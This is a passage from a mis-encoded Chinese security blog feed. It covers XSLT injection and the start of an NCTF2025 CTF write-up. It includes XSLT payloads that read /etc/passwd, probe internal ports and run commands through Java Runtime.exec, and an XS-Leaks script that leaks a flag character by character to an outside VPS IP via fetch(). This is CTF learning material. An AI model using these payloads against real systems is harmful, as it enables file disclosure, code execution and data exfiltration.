¹å…ƒç´ ï¼Œå®šä¹‰äº†è½¬æ¢çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¦‚ç‰ˆæœ¬å·å’Œå‘½åç©ºé—´ã€‚<br>xsl:templateï¼šå®šä¹‰è½¬æ¢æ¨¡æ¿ï¼Œå¯ä»¥åŒ…å«åŒ¹é…æ¨¡å¼å’Œæ¨¡æ¿è§„åˆ™ã€‚<br>xsl:for-eachï¼šç”¨äºè¿­ä»£XMLæ–‡æ¡£ä¸­çš„èŠ‚ç‚¹é›†åˆã€‚<br>xsl:ifã€xsl:chooseã€xsl:whenï¼šæ¡ä»¶è¯­å¥ï¼Œç”¨äºåŸºäºæ¡ä»¶é€‰æ‹©ä¸åŒçš„è½¬æ¢è·¯å¾„ã€‚<br>xsl:value-ofï¼šç”¨äºè¾“å‡ºXMLèŠ‚ç‚¹çš„æ–‡æœ¬å†…å®¹ã€‚<br>xsl:variableï¼šå®šä¹‰å˜é‡ï¼Œç”¨äºå­˜å‚¨å’Œé‡ç”¨è½¬æ¢è¿‡ç¨‹ä¸­çš„æ•°æ®ã€‚<br>xsl:paramï¼šå®šä¹‰å‚æ•°ï¼Œå…è®¸åœ¨è°ƒç”¨æ¨¡æ¿æ—¶ä¼ é€’å‚æ•°ã€‚<br>xsl:includeã€xsl:importï¼šç”¨äºåŒ…å«æˆ–å¯¼å…¥å…¶ä»–XSLTæ ·å¼è¡¨ã€‚</p><p>å…·ä½“çš„å¯ä»¥å»çœ‹ä¸€ä¸‹èœé¸Ÿï¼š<a href="https://www.runoob.com/xsl/xsl-tutorial.html">https://www.runoob.com/xsl/xsl-tutorial.html</a></p><h2 id="æ¶æ„åˆ©ç”¨"><a href="#æ¶æ„åˆ©ç”¨" class="headerlink" title="æ¶æ„åˆ©ç”¨"></a>æ¶æ„åˆ©ç”¨</h2><p>xsltæ˜¯æœ‰ä¸€äº›å‡½æ•°çš„ï¼Œå…¶ä¸­ä¸€äº›å‡½æ•°æˆ–è€…æ ‡ç­¾æ˜¯æˆ‘ä»¬èƒ½å¤Ÿåˆ©ç”¨çš„ï¼Œå¯ä»¥å»ç¿»çœ‹å®˜æ–¹æ–‡æ¡£</p><h3 id="system-property"><a href="#system-property" class="headerlink" title="system-property()"></a>system-property()</h3><p>è¿™ä¸ªå‡½æ•°å¯ä»¥ç”¨æ¥è¿”å›ç³»ç»Ÿå±æ€§çš„å€¼ã€‚</p><p>è¯­æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">system-property(name)<br></code></pre></td></tr></table></figure><p>ç›¸å…³æè¿°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">xsl:versionï¼Œä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºå¤„ç†å™¨å®ç°çš„XSLTç‰ˆæœ¬ï¼›å¯¹äºå®ç°æœ¬æ–‡æ¡£æŒ‡å®šçš„XSLTç‰ˆæœ¬çš„XSLTå¤„ç†å™¨ï¼Œè¿™æ˜¯æ•°å­—1.0<br>xsl:vendorï¼Œä¸€ä¸ªæ ‡è¯†XSLTå¤„ç†å™¨ä¾›åº”å•†çš„å­—ç¬¦ä¸²<br>xsl:vendor-urlï¼Œä¸€ä¸ªåŒ…å«æ ‡è¯†XSLTå¤„ç†å™¨ä¾›åº”å•†çš„urlçš„å­—ç¬¦ä¸²ï¼›é€šå¸¸ï¼Œè¿™æ˜¯ä¾›åº”å•†ç½‘ç«™çš„ä¸»é¡µã€‚<br></code></pre></td></tr></table></figure><p>ç”¨æ³•</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/fruits&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;system-property(&#x27;xsl:vendor&#x27;)&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="document"><a href="#document" class="headerlink" title="document()"></a>document()</h3><p>ç”¨äºè®¿é—®å¤–éƒ¨ XML æ–‡æ¡£ä¸­çš„èŠ‚ç‚¹ã€‚</p><p>å› ä¸ºä»–çš„ä¼ å‚ä¸ºURI</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">document( URI [,node-set] )<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¯ä»¥è¯»å–æ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/fruits&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:copy-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;document(&#x27;/etc/passwd&#x27;)&quot;</span>/&gt;</span><br>    Fruits:<br>        <span class="hljs-comment">&lt;!-- Loop for each fruit --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:for-each</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;fruit&quot;</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- Print name: description --&gt;</span><br>      - <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;name&quot;</span>/&gt;</span>: <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;description&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:for-each</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç«¯å£æ¢æµ‹</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/fruits&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:copy-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;document(&#x27;http://172.16.132.1:25&#x27;)&quot;</span>/&gt;</span><br>    Fruits:<br>        <span class="hljs-comment">&lt;!-- Loop for each fruit --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:for-each</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;fruit&quot;</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- Print name: description --&gt;</span><br>      - <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;name&quot;</span>/&gt;</span>: <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;description&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:for-each</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="rce"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>è¿™ä¸€éƒ¨åˆ†æ˜¯æ¯”è¾ƒé‡è¦çš„äº†ï¼Œå®ƒå¯ä»¥ä»»æ„å‘½ä»¤æ‰§è¡Œ</p><p>xsltå¤„ç†å™¨å¦‚æœä¸ç¦ç”¨ï¼Œèƒ½å°†æœ¬æœºçš„javaè¯­è¨€æ–¹æ³•æš´éœ²ä¸ºXSLTå‡½æ•°ï¼Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:rt</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Runtime&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:ob</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;rtobject&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;rt:getRuntime()&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;process&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;rt:exec($rtobject,&#x27;ls&#x27;)&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;processString&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;ob:toString($process)&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;$processString&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œé€»è¾‘è§£é‡Š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;xsl:variable name=&quot;rtobject&quot; select=&quot;rt:getRuntime()&quot;/&gt;ï¼šåˆ›å»ºäº†ä¸€ä¸ªå˜é‡rtobjectï¼Œå®ƒè°ƒç”¨Runtime.getRuntime()æ–¹æ³•æ¥è·å–å½“å‰Javaåº”ç”¨ç¨‹åºçš„è¿è¡Œæ—¶ç¯å¢ƒã€‚<br><br>&lt;xsl:variable name=&quot;process&quot; select=&quot;rt:exec($rtobject,&#x27;ls&#x27;)&quot;/&gt;ï¼šåˆ›å»ºäº†ä¸€ä¸ªå˜é‡processï¼Œå®ƒè°ƒç”¨Runtime.exec()æ–¹æ³•æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤lsï¼ˆåœ¨Unix/Linuxç³»ç»Ÿä¸­åˆ—å‡ºç›®å½•å†…å®¹ï¼‰ã€‚<br><br>&lt;xsl:variable name=&quot;processString&quot; select=&quot;ob:toString($process)&quot;/&gt;ï¼šåˆ›å»ºäº†ä¸€ä¸ªå˜é‡processStringï¼Œå®ƒå°†processå¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚<br><br>&lt;xsl:value-of select=&quot;$processString&quot;/&gt;ï¼šè¾“å‡ºprocessStringå˜é‡çš„å€¼ï¼Œå³lså‘½ä»¤çš„è¾“å‡ºç»“æœã€‚<br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://h4cking2thegate.github.io/posts/48198/#PKCS9Attributes">https://h4cking2thegate.github.io/posts/48198/#PKCS9Attributes</a></p><p><a href="https://xz.aliyun.com/t/11732?u_atoken=2f8cf1aa195092bd55fd48ca5c229089&u_asig=1a0c39d517326969518455856e0045">https://xz.aliyun.com/t/11732?u_atoken=2f8cf1aa195092bd55fd48ca5c229089&amp;u_asig=1a0c39d517326969518455856e0045</a></p><p><a href="https://xz.aliyun.com/t/15670?u_atoken=4522326c1b0eeaa26f519f65d9e58254&u_asig=0a472f5217326934441316160e013b">https://xz.aliyun.com/t/15670?u_atoken=4522326c1b0eeaa26f519f65d9e58254&amp;u_asig=0a472f5217326934441316160e013b</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ°´ä¸€ä¸‹åšå®¢ï¼Œä¹‹å‰è¿™ç¯‡å†™åœ¨æœ¬åœ°äº†ï¼Œç°åœ¨æ”¾åˆ°åšå®¢æ–¹ä¾¿ç”¨çš„æ—¶å€™çœ‹ï¼Œå› ä¸ºå‰é¢nacosçš„æ—¶å€™ç”¨åˆ°äº†ä¸€äº›&lt;/p&gt;
&lt;p&gt;è¿™ä¸¤æ¡é“¾å­éƒ½æ˜¯åŸºäºåŸç”Ÿjdkçš„ï¼Œä¸éœ€è¦å…¶ä»–ä¾èµ–&lt;/p&gt;
&lt;h1 id=&quot;multiuidefaultsåˆ©ç”¨é“¾&quot;&gt;&lt;a href=&quot;#MultiUIDefaultsåˆ©</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>NCTF2025å¤ç°</title>
    <link href="https://clowsman.github.io/2025/03/26/NCTF2025%E5%A4%8D%E7%8E%B0/"/>
    <id>https://clowsman.github.io/2025/03/26/NCTF2025%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-03-26T14:23:32.000Z</published>
    <updated>2025-03-26T14:27:53.633Z</updated>
    
    <content type="html"><![CDATA[<p>å½“æ—¶æ²¡æ€ä¹ˆæ‰“ï¼Œç°åœ¨æ¥å¤ç°ä¸€ä¸‹ï¼Œä¹Ÿæ˜¯å­¦åˆ°è›®å¤šä¸œè¥¿</p><h1 id="internal_api"><a href="#internal-api" class="headerlink" title="internal_api"></a>internal_api</h1><p>ä¸€ä¸ªæ–°å­¦åˆ°çš„XSLeakä¾§ä¿¡é“æ”»å‡»</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://ek1ng.com/XSLeaks%20%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB.html%EF%BC%8Chttps://wiki.scuctf.com/ctfwiki/web/9.xss/xsleaks/">https://ek1ng.com/XSLeaks%20%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB.htmlï¼Œhttps://wiki.scuctf.com/ctfwiki/web/9.xss/xsleaks/</a></p><p><strong>XSLeaksæ˜¯ä»€ä¹ˆ</strong></p><p>XS-Leaks å…¨ç§° Cross-site leaksï¼Œå¯ä»¥ç”¨æ¥ <strong>æ¢æµ‹ç”¨æˆ·æ•æ„Ÿä¿¡æ¯</strong>ã€‚</p><p>åˆ©ç”¨æ–¹å¼ã€åˆ©ç”¨æ¡ä»¶ç­‰éƒ½å’Œ csrf è¾ƒä¸ºç›¸ä¼¼ã€‚</p><p>è¯´åˆ°æ¢æµ‹ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ï¼Œæ˜¯å¦‚ä½•è¿›è¡Œæ¢æµ‹çš„ï¼Ÿå’Œcsrf ç›¸ä¼¼åœ¨å“ªï¼Ÿ</p><p>è®¾æƒ³ç½‘ç«™å­˜åœ¨ä¸€ä¸ªæ¨¡ç³ŠæŸ¥æ‰¾åŠŸèƒ½ï¼ˆè‹¥å‰ç¼€åŒ¹é…åˆ™è¿”å›å¯¹åº”ç»“æœï¼‰ä¾‹å¦‚ <code>http://localhost/search?query=</code>ï¼Œé¡µé¢æ˜¯å­˜åœ¨ xss æ¼æ´ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªç±»ä¼¼ flag çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”åªæœ‰ä¸åŒç”¨æˆ·æŸ¥è¯¢çš„ç»“æœé›†ä¸åŒã€‚è¿™æ—¶ä½ å¯èƒ½ä¼šå°è¯• csrfï¼Œä½†æ˜¯ç”±äºç½‘ç«™æ­£ç¡®é…ç½®äº† CORSï¼Œå¯¼è‡´æ— æ³•é€šè¿‡ xss ç»“åˆ csrf è·å–åˆ°å…·ä½“çš„å“åº”ã€‚è¿™ä¸ªæ—¶å€™å°±å¯ä»¥å°è¯• XS-Leaksã€‚</p><p>è™½ç„¶æ— æ³•è·å–å“åº”çš„å†…å®¹ï¼Œä½†æ˜¯æ˜¯å¦æŸ¥æ‰¾æˆåŠŸå¯ä»¥é€šè¿‡ä¸€äº›ä¾§ä¿¡é“æ¥åˆ¤æ–­ã€‚é€šè¿‡å“ªäº›ä¾§ä¿¡é“åˆ¤æ–­å‘¢ï¼Ÿ</p><p>è¿™äº›ä¾§ä¿¡é“çš„æ¥æºé€šå¸¸æœ‰ä»¥ä¸‹å‡ ç±»ï¼š</p><ol><li>æµè§ˆå™¨çš„ api (e.g. <a href="https://xsleaks.dev/docs/attacks/frame-counting/">Frame Counting</a> and <a href="https://xsleaks.dev/docs/attacks/timing-attacks/">Timing Attacks</a>)</li><li>æµè§ˆå™¨çš„å®ç°ç»†èŠ‚å’Œbugs (e.g. <a href="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/">Connection Pooling</a> and <a href="https://xsleaks.dev/docs/attacks/historical/content-type/#typemustmatch">typeMustMatch</a>)</li><li>ç¡¬ä»¶bugs (e.g. Speculative Execution Attacks <a href="https://xsleaks.dev/#fn:4">4</a>)</li></ol><p>é€šè¿‡æµ‹ä¿¡é“æ”»å‡»å¯ä»¥è·å–åˆ°ç”¨æˆ·éšç§ä¿¡æ¯ã€‚</p><p>ç»™äº†ä¸¤ä¸ªæç¤º</p><p><img src="https://cdn.clown2024.cn/image-20250323214108405.png" alt="image-20250323214108405"></p><p>searchæˆåŠŸçŠ¶æ€ç ä¸º200ï¼Œå¤±è´¥ä¸º500</p><p>å®¡è®¡æºç ï¼Œflagåœ¨æ•°æ®åº“ï¼Œç„¶åè¢«è®¾ç½®ä¸ºéšè—</p><p><img src="https://cdn.clown2024.cn/image-20250323215259076.png" alt="image-20250323215259076"></p><p>ç„¶ååªæœ‰botå¯ä»¥å»è®¿é—®éšè—çš„flag</p><p>æ‰€ä»¥æ•´ä½“æ€è·¯å°±æ˜¯botè®¿é—®æ‰§è¡Œjsä»£ç çš„pocç„¶åç›²æ³¨flagå¸¦å‡ºæ¥ç»™æ”»å‡»è€…</p><p><del>ä½†æ˜¯å§æ§½ä¸ºä»€ä¹ˆå•Šï¼Œæˆ‘ä¸ç†è§£ä¸ºä»€ä¹ˆexpä¼šæ‰“ä¸é€š</del></p><p>æ‰¾åˆ°åŸå› äº†ï¼Œæ²¡çœ‹åˆ°object.dataæ˜¯ç«ç‹æ‰æœ‰çš„äº†ï¼Œä»–çš„botæ˜¯chromeçš„ï¼Œå¾—æ”¹æˆscriptï¼Œçœ‹gm7ä½¬çš„æ–‡ç« æœ‰å†™ï¼Œä»¥å‰æ²¡ç»†çœ‹éº»äº†ï¼š<a href="https://gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.web%E6%BC%8F%E6%B4%9E/20.xs-leaks/?h=script#%E4%BB%80%E4%B9%88%E6%98%AFxs-leaks">https://gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.web%E6%BC%8F%E6%B4%9E/20.xs-leaks/?h=script#%E4%BB%80%E4%B9%88%E6%98%AFxs-leaks</a></p><p>æœ€ç»ˆexp</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">VPS_IP</span> = <span class="hljs-string">&#x27;http://43.139.107.213:1389&#x27;</span></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> chars = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span>;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> <span class="hljs-title function_">escape</span> = (<span class="hljs-params">c</span>) =&gt; &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> c.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[.*+?^=!:$&#123;&#125;()|[\]\/\\]/g</span>, <span class="hljs-string">&#x27;\\$&amp;&#x27;</span>);</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> <span class="hljs-title function_">oracle</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">url</span>) =&gt; &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-comment">// const object = document.createElement(&quot;object&quot;);</span></span><br><span class="language-javascript">            <span class="hljs-comment">// object.data = url;</span></span><br><span class="language-javascript">            <span class="hljs-comment">// object.onload = resolve;</span></span><br><span class="language-javascript">            <span class="hljs-comment">// object.onerror = reject;  </span></span><br><span class="language-javascript">            <span class="hljs-comment">// document.head.appendChild(object);</span></span><br><span class="language-javascript">            <span class="hljs-keyword">let</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>);</span><br><span class="language-javascript">            script.<span class="hljs-property">src</span> = url;</span><br><span class="language-javascript">            script.<span class="hljs-property">onload</span> = resolve;</span><br><span class="language-javascript">            script.<span class="hljs-property">onerror</span> = reject;</span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-property">head</span>.<span class="hljs-title function_">appendChild</span>(script);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> <span class="hljs-title function_">search</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">url</span>) =&gt; &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">await</span> <span class="hljs-title function_">oracle</span>(url)</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="language-javascript">        &#125; <span class="hljs-keyword">catch</span> (e) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    (<span class="hljs-keyword">async</span> () =&gt; &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">let</span> flag = <span class="hljs-string">&#x27;nctf&#123;&#x27;</span>;</span><br><span class="language-javascript">        <span class="hljs-keyword">let</span> url = <span class="hljs-string">`http://127.0.0.1:8000/internal/search?s=<span class="hljs-subst">$&#123;flag&#125;</span>`</span></span><br><span class="language-javascript">        <span class="hljs-keyword">while</span> (flag.<span class="hljs-title function_">charAt</span>(flag.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>) !== <span class="hljs-string">&quot;&#125;&quot;</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">let</span> i <span class="hljs-keyword">of</span> chars ) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span> ( <span class="hljs-title function_">await</span>(<span class="hljs-title function_">search</span>(url + <span class="hljs-built_in">escape</span>(i))) ) &#123;</span><br><span class="language-javascript">                url = url + <span class="hljs-built_in">escape</span>(i)</span><br><span class="language-javascript">                flag += i</span><br><span class="language-javascript">                <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;VPS_IP&#125;</span>/?flag=<span class="hljs-subst">$&#123;flag&#125;</span>`</span>, &#123;<span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>&#125;)</span><br><span class="language-javascript">                <span class="hljs-keyword">break</span>;</span><br><span class="language-javascript">        &#125;   <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;failed&#x27;</span>);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)();</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250324010628655.png" alt="image-20250324010628655"></p><h1 id="ez_dash_revenge"><a href="#ez-dash-revenge" class="headerlink" title="ez_dash_revenge"></a>ez_dash_revenge</h1><p>åˆæ˜¯pydashçš„åŸå‹é“¾æ±¡æŸ“ï¼Œå°è¯•äº†åŠå¤©ç»•ä¸è¿‡é»‘åå•ï¼Œä¹Ÿæ‰¾ä¸åˆ°æ±¡æŸ“çš„ç‚¹</p><p>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Hints: Flagåœ¨ç¯å¢ƒå˜é‡ä¸­</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span><br><br><br><span class="hljs-keyword">import</span> pydash<br><span class="hljs-keyword">import</span> bottle<br><br><span class="hljs-comment"># for i in dir(pydash):</span><br><span class="hljs-comment">#     print(&quot;============================================&quot;)</span><br><span class="hljs-comment">#     print(dir(i))</span><br><br><br>__forbidden_path__=[<span class="hljs-string">&#x27;__annotations__&#x27;</span>, <span class="hljs-string">&#x27;__call__&#x27;</span>, <span class="hljs-string">&#x27;__class__&#x27;</span>, <span class="hljs-string">&#x27;__closure__&#x27;</span>,<br>               <span class="hljs-string">&#x27;__code__&#x27;</span>, <span class="hljs-string">&#x27;__defaults__&#x27;</span>, <span class="hljs-string">&#x27;__delattr__&#x27;</span>, <span class="hljs-string">&#x27;__dict__&#x27;</span>,<br>               <span class="hljs-string">&#x27;__dir__&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;__eq__&#x27;</span>, <span class="hljs-string">&#x27;__format__&#x27;</span>,<br>               <span class="hljs-string">&#x27;__ge__&#x27;</span>, <span class="hljs-string">&#x27;__get__&#x27;</span>, <span class="hljs-string">&#x27;__getattribute__&#x27;</span>,<br>               <span class="hljs-string">&#x27;__gt__&#x27;</span>, <span class="hljs-string">&#x27;__hash__&#x27;</span>, <span class="hljs-string">&#x27;__init__&#x27;</span>, <span class="hljs-string">&#x27;__init_subclass__&#x27;</span>,<br>               <span class="hljs-string">&#x27;__kwdefaults__&#x27;</span>, <span class="hljs-string">&#x27;__le__&#x27;</span>, <span class="hljs-string">&#x27;__lt__&#x27;</span>, <span class="hljs-string">&#x27;__module__&#x27;</span>,<br>               <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;__ne__&#x27;</span>, <span class="hljs-string">&#x27;__new__&#x27;</span>, <span class="hljs-string">&#x27;__qualname__&#x27;</span>,<br>               <span class="hljs-string">&#x27;__reduce__&#x27;</span>, <span class="hljs-string">&#x27;__reduce_ex__&#x27;</span>, <span class="hljs-string">&#x27;__repr__&#x27;</span>, <span class="hljs-string">&#x27;__setattr__&#x27;</span>,<br>               <span class="hljs-string">&#x27;__sizeof__&#x27;</span>, <span 